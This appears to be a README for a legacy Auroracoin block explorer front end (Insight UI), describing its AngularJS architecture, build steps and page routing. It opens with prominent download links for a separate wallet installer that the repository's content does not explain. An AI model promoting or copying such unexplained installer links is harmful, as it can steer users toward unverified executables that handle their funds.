![Insight UI reference repository for the Auroracoin block explorer](assets/aurora-wallet-desktop-app-banner.png)

# Insight UI

The web front end of the original Auroracoin block explorer, preserved as a reference repository. The downloads below are the companion Aurora Wallet desktop app.

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/blob/HEAD/COPYING"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


## What this repository does

This repository holds the browser application that displayed Auroracoin chain data to the public. It rendered the latest blocks, a block page with its transactions, a transaction page with inputs and outputs, an address page with balance and history, and a status panel for the node behind the explorer. Search accepted a block height, a block hash, a transaction identifier or an address and routed the request to the right page.

The front end is a single-page application built with AngularJS and styled with the Bootstrap framework of the period. It talks to the Insight API service over HTTP for queries and opens a WebSocket connection for live updates, which is how new blocks appeared without a refresh. Configuration lives in a small settings file that names the API endpoint, the network and the label shown in the page header, so one build could serve a testnet explorer as easily as a mainnet one.

The public assets under `public/` hold the templates, the styles, the images and the client-side scripts. Bower managed the front-end dependencies and Grunt ran the build tasks that concatenated and minified them.

## Who uses it

Anyone rebuilding a chain explorer reads this repository together with the API it consumes. The pair documents the full path of one request: a browser query, an API route, an index lookup and a rendered page. That makes it useful as a teaching example of an explorer architecture that fits in two small services.

Historians of the project use the page structure to understand what the community could see during the early years: which fields were displayed, how confirmations were counted, how a mining pool was labelled on a coinbase transaction and how an address history was paginated.

Holders of today use the current wallet instead. The section above downloads the Aurora Wallet installer, and the guide on [receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md) covers the modern way to read an address and its payment history inside the application.

## Setup

Install the front-end tooling with `npm install` and the browser dependencies with `bower install`, then run `grunt` to build the assets into `public/`. The build reads its endpoint configuration from the settings file, so point it at a running Insight API service before you open the page.

Serving the result is a static file task: any web server pointed at the built `public/` folder will do. The explorer expects the API to be reachable from the browser, which means the API service needs cross-origin access enabled for the explorer host.

## Contents

`public/` holds the built and source browser assets: templates, styles, images and scripts. `Gruntfile.js` holds the build tasks, `bower.json` holds the front-end dependency list, `package.json` holds the build tooling and `.bowerrc` sets the install location for the browser packages.

The API this front end calls lives in the insight-api repository, and the node layer behind that service lives in the bitcore-node repository.

## How a page is put together

The front end is a set of routes over one API. The home page asks for the latest blocks and renders them in a table. A block page asks for the block by height or hash and renders its header, its transaction count and its transaction list. A transaction page asks for the transaction and renders its inputs and outputs with values and addresses. An address page asks for the balance, the unspent outputs and the paginated history.

Search is a small router of its own. The input is inspected for a numeric height, a long hexadecimal hash, an address starting with the network prefix or a transaction identifier, and each case maps to a different route. Getting that order wrong is how an explorer sends a user to a 404 for a valid identifier.

Live updates arrive over a WebSocket. The client subscribes on load, appends new blocks to the top of the list and updates the status panel. When the socket drops, the page keeps working with manual refresh until the connection returns, which is the behaviour that made the explorer usable on a flaky connection.

The styling is Bootstrap with the project's own overrides, kept in the same public folder as the templates. Rebuilding the assets after an edit is a Grunt task, and the build output is what the web server serves.

The configuration file is deliberately small: an API endpoint, a network label and the title shown in the header. One build can therefore serve a test network explorer or a main network explorer without touching the templates.

## Documentation and license

The guide library in the [aurora-wallet-docs repository](https://github.com/aurora-coin/aurora-wallet-docs) covers the current wallet, and the article on [legacy repositories](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md) explains where this front end sits in the history of the project.

The code is published under the license recorded in the repository files, with the original upstream copyright notices retained.
